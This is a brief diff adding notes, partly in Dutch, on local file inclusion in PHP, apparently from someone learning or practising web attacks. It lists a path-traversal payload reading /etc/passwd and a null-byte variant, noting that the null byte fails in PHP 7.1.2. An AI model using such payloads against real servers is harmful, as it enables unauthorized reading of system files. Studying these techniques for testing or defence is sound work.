@@ -1,0 +1,5 @@
+?file=included_file.php
+hack 1 file: ../../../../../etc/passwd
+hack 2 file: ../../../../../etc/passwd%00 met null-byte aan het eind werkt niet in php 7.1.2
+
+
